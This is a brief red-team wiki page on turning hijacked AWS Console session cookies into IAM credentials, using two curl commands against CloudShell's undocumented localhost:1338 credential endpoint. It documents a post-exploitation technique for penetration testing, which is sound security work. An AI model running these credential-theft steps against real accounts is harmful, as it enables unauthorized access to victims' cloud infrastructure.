---
author_name: Nick Frichette
title: "Get IAM Credentials from a Console Session"
description: Convert access to the AWS Console into IAM credentials.
hide:
  - toc
---

# Get IAM Credentials from a Console Session

Original Research: [Christophe Tafani-Dereeper](https://blog.christophetd.fr/retrieving-aws-security-credentials-from-the-aws-console/?utm_source=pocket_mylist)

When performing a penetration test or red team assessment, it is not uncommon to gain access to a developer's machine. This presents an opportunity for you to jump into AWS infrastructure via credentials on the system. For a myriad of reasons you may not have access to credentials in the `.aws` folder, but instead have access to their browser's session cookies (for example via cookies.sqlite in FireFox).

Gaining access to the Console is great, but it may not be ideal. You may want to use certain tools that would instead require IAM credentials.

To get around this, we can leverage CloudShell. CloudShell exposes IAM credentials via an undocumented endpoint on port 1338. After loading session cookies from the victim into your browser, you can navigate to CloudShell and issue the following commands to get IAM credentials.

```
[user@cloudshell]$ TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")

[user@cloudshell]$ curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```
